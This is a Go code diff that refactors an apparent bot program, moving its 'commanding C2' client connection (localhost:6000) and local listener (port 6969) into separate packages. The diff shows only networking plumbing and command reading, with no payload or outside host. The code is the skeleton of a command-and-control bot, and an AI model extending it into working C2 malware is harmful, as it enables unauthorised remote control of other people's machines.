@@ -1,7 +1,9 @@
 package main
 
 import (
-	"bot/message"
+	cli "bot/communication/client"
+	srv "bot/communication/server"
+	msg "bot/message"
 	"bufio"
 	"bytes"
 	"fmt"
@@ -15,13 +17,7 @@ import (
 )
 
 const (
-	REMOTEHOST = "localhost"
-	REMORTPORT = ":6000"
-	
-	LOCALHOST  = "localhost"
-	LOCALPORT  = ":6969"
-	
-	TYPE       = "tcp4"
+
 	Msgsize    = 4096
 	UidLength  = 16
 	letterBytes = "0123456789abcdef"
@@ -31,8 +27,8 @@ const (
 )
 
 var (
-	wg sync.WaitGroup
-	O message.Bot
+	wg  sync.WaitGroup
+	O   msg.Bot
 	src = r.NewSource(time.Now().UnixNano())
 )
 
@@ -72,36 +68,7 @@ func messageInput(m string) []byte {
 	};
 }
 
-func connectToCommandingC2() (net.Conn) {
-	server, err := net.Dial(TYPE, REMOTEHOST + REMORTPORT)
-	if err != nil {
-		fmt.Println("Error connecting to commanding C2 server :", err.Error())
-	} else {
-		fmt.Println("Connected to " + REMOTEHOST + REMORTPORT)
-	}
-	return server;
-}
 
-func tryConnect()() {
-	defer wg.Done()
-	var remoteServer net.Conn = connectToCommandingC2()
-	if remoteServer != nil {
-		defer remoteServer.Close()
-	} else {
-		return;
-	}
-	writeData(remoteServer)
-}
-
-func startLocalServer() net.Listener {
-	listener, err := net.Listen(TYPE, LOCALHOST + LOCALPORT)
-	if err != nil {
-		fmt.Println("Error listening: ", err.Error())
-		os.Exit(1)
-	}
-	fmt.Println("Listening on " + LOCALHOST + LOCALPORT)
-	return listener;
-}
 
 func readCommands(conn net.Conn) (string, error) {
 	defer conn.Close()
@@ -139,6 +106,16 @@ func writeData(server net.Conn) () {
 	}
 }
 
+func tryConnect()() {
+	var remoteServer net.Conn = cli.ConnectToCommandingC2()
+	if remoteServer != nil {
+		defer remoteServer.Close()
+	} else {
+		return;
+	}
+	writeData(remoteServer)
+}
+
 func main() () {
 	O.Uid = generateRandomUid()
 	
@@ -149,7 +126,7 @@ func main() () {
 	go func() {
 		defer wg.Done()
 		
-		var listener net.Listener = startLocalServer()
+		var listener net.Listener = srv.StartLocalServer()
 		defer listener.Close()
 		
 		conn, err := listener.Accept()
